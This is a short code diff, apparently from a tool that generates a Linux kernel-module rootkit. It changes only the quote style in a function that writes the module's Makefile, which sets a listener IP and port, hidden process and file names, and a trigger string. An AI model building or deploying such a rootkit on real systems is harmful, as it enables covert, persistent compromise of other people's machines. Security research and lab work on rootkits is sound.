@@ -248,8 +248,8 @@ def _lkm_makefile_text(listener_ip: str, listener_port: str) -> str:
     return (
         "obj-m += rootkit.o\n"
         "\n"
-        f'LISTENER_IP ?= {listener_ip}\n'
-        f'LISTENER_PORT ?= {listener_port}\n'
+        f"LISTENER_IP ?= {listener_ip}\n"
+        f"LISTENER_PORT ?= {listener_port}\n"
         "HIDDEN_PROCESS_NAME ?= rootkit_proc\n"
         "HIDDEN_FILE_NAME ?= rootkit_file\n"
         "SPECIAL_STRING ?= knoires-lz\n"
